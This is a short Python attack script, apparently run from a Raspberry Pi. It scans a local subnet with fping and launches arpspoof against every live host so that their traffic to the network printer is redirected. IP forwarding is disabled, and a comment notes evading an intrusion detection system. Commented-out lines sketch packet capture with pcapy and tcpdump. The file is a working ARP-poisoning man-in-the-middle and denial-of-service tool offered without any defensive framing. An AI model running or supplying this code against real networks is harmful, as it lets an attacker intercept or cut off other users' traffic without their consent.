import subprocess as sub
import functools
import os

printer='10.0.0.1' # printer IP
network='10.0.0.0/24' # Network IP
me='10.0.0.11' #Raspberry Pi IP
ip_list=[]

#find all alive hosts on the network
p = sub.Popen(('sudo', 'fping', '-ag', network), stdout=sub.PIPE)

for line in iter(p.stdout.readline,b''):
    print (line.rstrip())
    if (printer!=line.rstrip()) and (me!=line.rstrip()):
        ip_list.append(line.rstrip())

#arpspoof printer and all other hosts
#we could have used python implementation of arpspoof here (open source), however, creating subprocesses seems to be faster
packet_forwarding= sub.call([ 'sysctl', '-w','net.ipv4.ip_forward=0'])
#against IDS

for ip in ip_list:
    print("HOST=", ip)
#    p1 = sub.Popen(( 'arpspoof', '-t', printer,ip), stdout=sub.PIPE)
    p2 = sub.Popen(( 'arpspoof', '-t', ip, printer), stdout=sub.PIPE)
#    pc = pcapy.open_live(str(self.port), max_bytes, promiscuous, read_timeout)
#    pc.setfilter('not ip6')
#    p3=sub.Popen(('sudo',  'tcpdump', '> traffic.txt'), stdout=sub.PIPE)
#this method works, however, depending on how many hosts there are on the network, is very slow.